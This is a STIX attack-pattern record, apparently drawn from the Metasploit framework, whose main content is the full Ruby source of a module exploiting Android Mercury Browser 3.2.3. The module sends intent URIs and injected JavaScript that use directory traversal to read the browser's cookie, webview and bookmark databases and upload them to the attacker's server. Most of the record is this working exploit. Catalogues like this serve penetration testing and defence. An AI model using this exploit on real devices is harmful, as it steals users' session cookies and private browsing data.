{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f542ea2-2ee7-4d1b-83b7-e52e3d9790a1",
    "created": "2024-08-14T16:21:58.872137Z",
    "modified": "2024-08-14T16:21:58.872141Z",
    "name": "Android Mercury Browser Intent URI Scheme and Directory Traversal Vulnerability",
    "description": " This module exploits an unsafe intent URI scheme and directory traversal found in Android Mercury Browser version 3.2.3. The intent allows the attacker to invoke a private wifi manager activity, which starts a web server for Mercury on port 8888. The webserver also suffers a directory traversal that allows remote access to sensitive files.  By default, this module will go after webviewCookiesChromium.db, webviewCookiesChromiumPrivate.db webview.db, and bookmarks.db. But if this isn't enough, you can also specify the ADDITIONAL_FILES datastore option to collect more files. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/android_mercury_parseuri.rb",
            "external_id": "android_mercury_parseuri.rb"
        },
        {
            "source_name": "reference",
            "url": "http://rotlogix.com/2015/08/23/exploiting-the-mercury-browser-for-android/"
        },
        {
            "source_name": "reference",
            "url": "http://versprite.com/og/multiple-vulnerabilities-in-mercury-browser-for-android-version-3-0-0/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Android Mercury Browser Intent URI Scheme and Directory Traversal Vulnerability',\n      'Description'    => %q{\n        This module exploits an unsafe intent URI scheme and directory traversal found in\n        Android Mercury Browser version 3.2.3. The intent allows the attacker to invoke a\n        private wifi manager activity, which starts a web server for Mercury on port 8888.\n        The webserver also suffers a directory traversal that allows remote access to\n        sensitive files.\n\n        By default, this module will go after webviewCookiesChromium.db, webviewCookiesChromiumPrivate.db,\n        webview.db, and bookmarks.db. But if this isn't enough, you can also specify the\n        ADDITIONAL_FILES datastore option to collect more files.\n      },\n      'Author'         =>\n        [\n          'rotlogix', # Vuln discovery, PoC, etc\n          'sinn3r',\n          'joev'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://rotlogix.com/2015/08/23/exploiting-the-mercury-browser-for-android/' ],\n          [ 'URL', 'http://versprite.com/og/multiple-vulnerabilities-in-mercury-browser-for-android-version-3-0-0/' ]\n        ]\n    ))\n\n    register_options(\n      [\n        OptString.new('ADDITIONAL_FILES', [false, 'Additional files to steal from the device'])\n      ])\n  end\n\n  def is_android?(user_agent)\n    user_agent.include?('Android')\n  end\n\n  def get_html\n    %Q|\n    <html>\n    <head>\n    <meta charset=\"utf-8\" />\n    </head>\n    <body>\n    <script>\n    location.href=\"intent:#Intent;SEL;component=com.ilegendsoft.mercury/.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end\";\n    setTimeout(function() {\n      location.href=\"intent:#Intent;S.load=javascript:eval(atob('#{Rex::Text.encode_base64(uxss)}'));SEL;component=com.ilegendsoft.mercury/com.ilegendsoft.social.common.SimpleWebViewActivity;end\";\n    }, 500);\n    </script>\n    </body>\n    </html>\n    |\n  end\n\n  def backend_url\n    proto = (datastore['SSL'] ? 'https' : 'http')\n    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : \":#{datastore['SRVPORT']}\"\n    resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource\n\n    \"#{proto}://#{my_host}#{port_str}#{resource}/catch\"\n  end\n\n  def uxss\n    %Q|\n      function exploit() {\n        history.replaceState({},{},'/storage/emulated/0/Download/');\n        var urls = #{JSON.generate(file_urls)};\n        urls.forEach(function(url) {\n          var x = new XMLHttpRequest();\n          x.open('GET', '/dodownload?fname=../../../..'+url);\n          x.responseType = 'arraybuffer';\n          x.send();\n          x.onload = function(){\n            var buff = new Uint8Array(x.response);\n            var hex = Array.prototype.map.call(buff, function(d) {\n              var c = d.toString(16);\n              return (c.length < 2) ? 0+c : c;\n            }).join('');\n            var send = new XMLHttpRequest();\n            send.open('POST', '#{backend_url}/'+encodeURIComponent(url.replace(/.*\\\\//,'')));\n            send.setRequestHeader('Content-type', 'text/plain');\n            send.send(hex);\n          };\n        });\n      }\n\n      var q = window.open('http://localhost:8888/','x');\n      q.onload = function(){ q.eval('('+exploit.toString()+')()'); };\n    |\n  end\n\n  def file_urls\n    files = [\n      '/data/data/com.ilegendsoft.mercury/databases/webviewCookiesChromium.db',\n      '/data/data/com.ilegendsoft.mercury/databases/webviewCookiesChromiumPrivate.db',\n      '/data/data/com.ilegendsoft.mercury/databases/webview.db',\n      '/data/data/com.ilegendsoft.mercury/databases/bookmarks.db'\n    ]\n\n    if datastore['ADDITIONAL_FILES']\n      files.concat(datastore['ADDITIONAL_FILES'].split)\n    end\n\n    files\n  end\n\n  def on_request_uri(cli, req)\n    print_status(\"Requesting: #{req.uri}\")\n\n    unless is_android?(req.headers['User-Agent'])\n      print_error('Target is not Android')\n      send_not_found(cli)\n      return\n    end\n\n    if req.method =~ /post/i\n      if req.body\n        filename = File.basename(req.uri) || 'file'\n        output = store_loot(\n          filename, 'text/plain', cli.peerhost, hex2bin(req.body), filename, 'Android mercury browser file'\n        )\n        print_good(\"Stored #{req.body.bytes.length} bytes to #{output}\")\n      end\n\n      return\n    end\n\n    print_status('Sending HTML...')\n    html = get_html\n    send_response_html(cli, html)\n  end\n\n  def hex2bin(hex)\n    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join\n  end\n\n\n  def run\n    exploit\n  end\nend\n"
}